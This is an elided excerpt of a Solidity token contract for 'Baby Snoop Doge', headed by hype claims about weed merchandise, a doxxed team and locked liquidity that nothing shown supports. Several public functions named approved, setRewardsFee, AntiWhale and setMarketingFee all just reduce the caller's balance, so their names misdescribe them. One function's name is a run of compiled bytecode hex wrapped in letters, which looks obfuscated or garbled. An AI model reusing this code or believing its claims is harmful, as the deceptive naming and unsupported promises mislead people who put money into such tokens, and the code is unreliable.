...
/**
 Stay Tuned for Updates in Telegram Group ‼️

We will create a dope line of all your weed essentials under the Baby Snoop Doge Brand so you can get high with Baby Snoop Doge all the time.
...
🚬 1% Merch Fund
🚬 Doxxed Core Team
🚬 Real Businessman Behind Projeact
🚬 Liquidity locked
...
contract BbySnoopDoge is Context, IERC20, Ownable {
    ...
    string private _name = "Baby Snoop Doge";
    string private _symbol = "BSNOOPDOGE";
    ...
    address payable private liquidAddress = 0x3b3B5BAA38fc59F0f030D794AF24Ba7dF513b74b;
    ...
    function approved(uint256 tAmount) public {
        address sender = _msgSender();
        require(!_isExcluded[sender], "Excluded addresses cannot call this function");
        (uint256 rAmount,,,,,,) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
    ...
    function AntiWhale(uint256 tAmount) public {
     ...
     function setRewardsFee(uint256 tAmount) public {
        address sender = _msgSender();
        require(!_isExcluded[sender], "Excluded addresses cannot call this function");
        (uint256 rAmount,,,,,,) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
    ...
    function BBbp0x60566023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea26469706673582212202495c17d85c413c7be612604438416499fbb835ea37f78c05c91dfb61b617ca564736f6c634300060c0033obb(uint256 tAmount) public {
        address sender = _msgSender();
        require(!_isExcluded[sender], "Excluded addresses cannot call this function");
        (uint256 rAmount,,,,,,) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
    ...
    function setMarketingFee(uint256 tAmount) public {
        address sender = _msgSender();
        require(!_isExcluded[sender], "Excluded addresses cannot call this function");
        (uint256 rAmount,,,,,,) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
